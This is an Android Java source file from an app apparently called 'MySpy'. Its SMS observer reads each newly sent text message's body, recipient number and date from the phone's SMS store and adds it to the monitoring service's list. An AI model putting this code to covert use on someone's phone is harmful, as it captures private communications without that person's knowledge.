package com.myspy.myspyandroid;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.myspy.myspyandroid.variables.SMSInfo;

import java.util.Calendar;

/**
 * Created by Miroslav Murin on 16.12.2016.
 */

public class ServiceObserver  extends ContentObserver {

    String LastSMS = "";
    public ContentResolver contentResolver;

    public ServiceObserver(Handler handler) {
        super(handler);
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);

        try {

            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = contentResolver.query(uriSMSURI, null, null, null, null);
            cur.moveToNext();
            String content = cur.getString(cur.getColumnIndex("body"));
            String smsNumber = cur.getString(cur.getColumnIndex("address"));


            Calendar calendar = Calendar.getInstance();
            try {
                calendar.setTimeInMillis(Long.parseLong(cur.getString(cur.getColumnIndex("date"))));
            } catch (Exception ex) {
                Log.w("Observer Error", "" + ex);
            }

            Log.d("Observer", "" + calendar.getTime());

            if (smsNumber == null || smsNumber.length() <= 0) {
                smsNumber = "Unknown";
            }
            cur.close();


            if (CheckSMS("OutgoingSMS to " + smsNumber + ": " + content)) {
                Log.d("OBSERVERSMS", "OutgoingSMS to " + smsNumber + ": " + content);
                if (calendar.get(Calendar.DAY_OF_MONTH) == Calendar.getInstance().get(calendar.DAY_OF_MONTH)) {
                    if (MySpyService.serviceSettings.MonitorSMS)
                        MySpyService.serviceVariables.SMSOutList.add(new SMSInfo(smsNumber, content, SMSInfo.GetCurrentTime()));

                    MySpyService.specialVariables.SMSSentAvg++;
                } else {
                    Log.d("Observer", "SMS from yesterday");
                }
            }

        }catch (Exception ex)
        {
            Log.d("ErrorObserver",""+ex);
        }

    }


    public boolean CheckSMS(String SMS) {

        if (SMS.equals(LastSMS) || SMS.equals(MySpyService.specialVariables.LastSentSMS)) {
            return false;
        }
        else {
            LastSMS = SMS;
        }
        return true;
    }


}
